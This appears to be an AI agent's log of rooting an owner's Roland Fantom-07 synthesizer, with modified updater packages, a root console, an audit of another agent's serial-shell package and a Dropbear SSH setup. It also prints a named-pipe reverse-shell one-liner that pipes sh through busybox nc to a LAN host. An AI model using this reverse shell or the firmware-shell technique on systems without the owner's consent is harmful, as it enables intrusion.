# Fantom-07 live shell trial

2026-11-12. Hardware observations now supersede the earlier statement that no
prepared package had been tried. The former offline audit remains relevant to
its unverified USB-console and recovery assumptions.

## User-reported installation and error

Jacob copied `fantom-07-update-shell` onto USB storage and started with WRITE held.
Board 1 reached its End / move-memory-to-external-board-2 screen. Jacob then
performed the second update stage. Jacob subsequently confirmed that “Update (board2) End…” appeared before
power-off. On ordinary startup, the setlist appeared with a
“Program Version Error” popup. USB TO COMPUTER was connected to the Mac after the
first update stage, rather than before it.

This does not establish that the plaintext replacement updater ran, that the
modified archive was installed, or that the background shell is active. Program
Version Error can reflect a load/update/version problem. The known ttyGS0 shell
and BMC IPC collision is also a plausible contributor, not a proven diagnosis.
See the manufacturer’s
[Fantom-0 reference manual](https://static.roland.com/assets/media/pdf/FANTOM-06_07_08_Reference_eng01_W.pdf)
error-message list and [two-stage update procedure](https://www.roland.com/nz/support/by_product/fantom-07/updates_drivers/a0df616e-3d37-41d2-9464-d04a43c53193/).

## Read-only Mac USB observation

After startup, the Mac sees `FANTOM-06 07 08`, USB `0582:0221`, one configuration.
Its observed interfaces are Audio Control (class 1/subclass 1) and MIDI Streaming
(class 1/subclass 3), with no CDC serial interface. No cu.usbmodem/tty.usb device
appeared. The host has screen and cu, but not picocom. A different terminal program
cannot turn these observed MIDI interfaces into a serial console.

No console was opened and no MIDI/USB command was sent to the Fantom by the agent.
The unchanged old package still proposes a background shell on ttyGS0, which the
normal application also uses for BMC IPC. Its plaintext updater is an infinite
shell loop; the comment about exiting twice is not a demonstrated exit/recovery
procedure.

## Direct display/keyboard console

Jacob connected a USB computer keyboard to USB MEMORY and pressed Ctrl+Alt+F2.
He reported a login prompt or shell, then confirmed that entering root requested
a password. A single empty-password submission returned “login incorrect”.
Jacob subsequently reported that F1–F6 show login consoles, F7 shows the app,
and F8–F9 show only a top-left cursor and accept no input. Those blank displays
are not evidence of interactive shells. Console reachability is established by the user report; authenticated
shell access, root UID, kernel version and installed startup contents are not yet
verified. No other password guesses were proposed.

The user wants shell access prioritized in the current state rather than an
immediate stock restore. No power cycle, restore or additional flash was performed
by the agent during this investigation.

## Prepared alternative, not installed

`local/build_fantom_onscreen_probe.py` prepared a separate candidate under
`local/fantom-07-onscreen-probe-v108/`. It starts a delayed xterm on display :0
using the stock factory-test xterm/font path, prints id/uname and invokes an
interactive shell. It uses the unmodified encrypted updater and BMC image, leaves
the normal application launch, and does not attach a shell to ttyGS0. All tar
bytes outside the original 1547-byte go.sh payload were verified identical to
stock; shell syntax and all other regular-member hashes were checked.

The candidate _DATA_FNTM0 SHA-256 is
`d36213ac7d5d61baed907551859782e6a2ed38edce759dcbd0f02f1ad86fde50`.
Verified stock files are stored separately alongside it. This establishes build
identity, not updater acceptance, root execution, keyboard input under X or
successful recovery on hardware. After the direct-console and desktop-shortcut
checks yielded no shell, this candidate was selected as the next attempt in
response to Jacob's request for which files to put on the flash drive. All three
current file hashes and shell syntax were rechecked. Jacob subsequently reported
“ok it works” and requested a shell accessible from the Mac over USB. This is
user-reported success of the on-screen shell route. Jacob subsequently transcribed
id output establishing UID 0/root (see below); uname output is still absent.
No successful stock rollback has been observed.

The tty9 check is based on [systemd's debug-generator documentation](https://freedesktop.org/software/systemd/man/latest/systemd-debug-generator.html):
a debug shell uses tty9 by default only when enabled. It does not establish that
Roland enables it. The check sends no login guesses and changes no installed files.

## Graphical desktop check

The upstream NXP-family [Weston 3 desktop shell source](https://coral.googlesource.com/weston-imx/+/refs/tags/3.0.0-4/desktop-shell/shell.c)
registers modifier+Shift+F to toggle the focused window's fullscreen state. It
does not establish Roland's installed shell or shortcut configuration. A single
Windows/Super+Shift+F check on F7 was requested to see whether a desktop panel or
terminal launcher becomes visible. Jacob reported that the shortcut did nothing.
No terminal-launch shortcut
has been established for this device. The stock application tar contains
`_DATA/bin/weston-image`, but no member name matching weston configuration,
getty, systemd, shadow or rootfs; this is not an inventory of the installed OS.

## Review of the separately supplied GS1 package

Jacob requested inspection of `fantom-07-vtshell-update`, built by another agent.
Despite its name, it does not start a virtual-console shell: its script requests
`modprobe g_serial n_ports=2`, then runs a background interactive shell loop on
`/dev/ttyGS1`. It leaves the normal application launch in place and contains no
GS0 shell redirection. No files in that package were modified during review.

Verified identities:

| File | SHA-256 |
|---|---|
| `_DATA_FNTM0` | `3edc5a493b05171dfd37157e575a91f190972615a96d57449b91d573ddf3f18e` |
| `_DATA/go.sh` | `19ba3c25bf7677e00900bf09bf94d0c72f4434b39f3ba914650d8acba3c2c1be` |

All three supplied SHA256SUMS entries matched. The BMC image and encrypted
updater match stock v1.08. Both DATA archives contain 440 unique members with
identical names and per-member metadata other than archive offsets. Only go.sh
content differs; the other 345 regular files are identical. The script remains
1547 bytes but was moved to the archive's end, preserving the order of all other
members. This is not a byte-preserving tar patch. `/bin/sh -n` passed without
executing the script. There is also an unrelated initial-date text change from
`2022/01/01` to `2022-01-01`.

### Assessment

The retained Roland GPL `drivers/usb/gadget/legacy/serial.c` supports n_ports and
registers that many functions on the same USB gadget configuration. With the
expected initially free line allocation and a successful initial module load,
two functions can allocate GS0 and GS1. This fixes the direct shared-TTY shell
design, conditional on installation/execution and the deployed driver matching.
It does **not** route the second function to another physical connector. The
comment promising a second macOS cu.usbmodem device is unsupported by the observed
MIDI-only USB TO COMPUTER connection. The GS0 gadget's peer remains unverified;
an internal peer is plausible given its established BMC IPC use.

Other unresolved conditions:

* If g_serial was already loaded, another modprobe invocation does not reconfigure
  its existing instance; the package does not establish an initial load or check
  whether GS1 appeared. A failed stdin open prevents the shell from starting.
* Two ACM functions change the gadget descriptors and endpoint requirements. The
  existing peer's support for that configuration is unknown, so preserving GS0's
  name does not establish unchanged BMC communication.
* The retained `function/u_serial.c:346..356,430` has one global receive callback
  set by gserial_set_func, invoked without checking the port number. A bounded
  scan of all C/header members found only its definition and declaration, no
  registration caller. The default callback is inert; an out-of-tree/installed
  module could register another. This is an additional unresolved isolation
  condition, not evidence of actual cross-port BMC processing. The subsequent
  [post-root study](fantom-core0-key-post-root-study.md) identified the installed
  tickgen module as the registration caller and traced its stateful IPC/clock
  parser; the earlier absence applies only to the retained GPL C/header scan.
* Successful stock rollback, the executing UID and resolution of Program Version
  Error are still unverified.

Conclusion: cleaner than the GS0 payload, but not a demonstrated Mac-accessible
shell or a proven BMC-safe configuration. The display/USB-keyboard path already
works for local consoles; a shell on that path avoids changing the gadget used
by the normal app. No additional firmware was flashed during this review.

## Transition from display shell to remote access

After Jacob's success report, the Mac still had no cu.usbmodem device. A fresh
read-only USB inventory showed the Fantom as `0582:0221`, with no additional
serial gadget listed. The Mac's RTL8156 internet adapter remained on en14; it
was not reconfigured. Fantom-side id, net-interface names, UDC names, GS device
nodes and installed SSH/tool paths were requested. A USB hub plus spare USB
Ethernet adapter was proposed as a possible host-port route, conditional on
driver and SSH availability; it is not yet a working connection. No gadget was
unbound, serial module unloaded, network listener started or root login policy
changed by the agent.

Jacob subsequently transcribed these live results:

* id: UID 0/root, group 0/root. His text spelled the gid label as git; the UID
  and root group values are unambiguous.
* Network interfaces: eth0 and lo.
* UDC: ci_hdrc.1. Only `/dev/ttyGS0` was listed.
* `command -v dropbear sshd busybox lsusb` returned `/bin/busybox` and
  `/usr/bin/lsusb`; it found neither SSH daemon in the current command path.

Root access is now established by user-reported command output. This does not
identify the gadget's physical peer or establish an accessible Ethernet jack.
lsusb output, BusyBox telnetd availability and hub availability were requested
next. The agent has not started a remote listener. A read-only local Docker
inventory attempt hit sandbox socket restrictions; no container/build was started.

Jacob then reported lsusb listing only a Linux Foundation USB 2.0 root hub and
the Logitech Unifying keyboard receiver. `busybox telnetd --help` returned
`telnetd: applet not found`. No USB Ethernet adapter or network shell is yet
established. Next minimal check: `busybox nc --help`; its presence and options
are unknown. If unavailable or lacking execution/listen support, prepare a
verified ARM64 Linux SSH server for transfer via USB storage. Prefer a temporary
isolated Ethernet link; do not reconfigure the BMC gadget to obtain connectivity.

Jacob reported nc usage beginning `nc [IPADDR PORT`, consistent with client-only
nc. This still permits an outbound connection with a named-pipe shell bridge;
neither nc -e nor a target-side listener is required. That bridge has not been
run. Next dependency is attaching a supported USB Ethernet adapter through a
hub and obtaining its interface/address. The Mac's current en14 IP query was
sandbox-blocked; re-read it with the required host access before supplying an
address. Keep the existing en14 internet configuration. A reverse shell would be
temporary and unencrypted; no listener is running yet.

## Verified remote root connection

2026-11-12: the RTL8153 USB Ethernet adapter acquired `192.168.0.100`.
The Mac's existing en14 address was read as `192.168.0.200`; its route to the
Fantom used en14, with no network configuration change. A single Mac listener
was started on `192.168.0.200:2323`. Jacob ran:

```sh
mkfifo /tmp/oshell && sh -i </tmp/oshell 2>&1 | busybox nc 192.168.0.200 2323 >/tmp/oshell
```

The agent then directly executed read-only commands through that connection:

* id: `uid=0(root) gid=0(root) groups=0(root)`.
* uname: `Linux imx8mmmi078 4.19.35-1.1.0+g0f9917c56d59 #1 SMP PREEMPT Wed Apr 21 02:41:55 UTC 2021 aarch64 GNU/Linux`.
* tty: `not a tty`; this is a working command stream, without a remote PTY.
* lsusb: RTL8153 `0bda:8153`, Logitech receiver `046d:c52b`, Genesys hub
  `05e3:0608`, Linux Foundation root hub `1d6b:0002`.
* ci_hdrc.1 function: g_serial; state: configured; current_speed: high-speed.
* Only `/dev/ttyGS0` exists.

This establishes working remote root over the USB Ethernet adapter/LAN route,
not serial access through USB TO COMPUTER. The gadget is configured with a peer,
but the peer's identity has not been measured. The agent made no target changes
through the connection during verification. Jacob's bridge creates the temporary
FIFO and processes; no startup persistence, SSH credentials or BMC modification
was added. Keep the on-screen session and Ethernet connection open for continued
access. The live Mac exec session is 32936 in this conversation; future agents
must check that it is still active before relying on it. The connection is
unencrypted and does not survive a reboot or disconnect automatically.

## Verified SSH follow-up

A static ARM64 Dropbear 2026.94 server was built from official source, transferred
with SHA256 checks and started from `/run/oscairn-ssh`. Root public-key login,
command execution and a real PTY were verified from the Mac. The final detached
daemon binds eth1 on port 2222, with password login and forwarding disabled.
No firmware, password database or USB gadget configuration was changed. See
[SSH package handoff](fantom-ssh-package-handoff.md) for artifact hashes, exact
commands, private-key location and package requirements. No reboot/persistence
test was performed. The temporary file-transfer HTTP server was stopped.
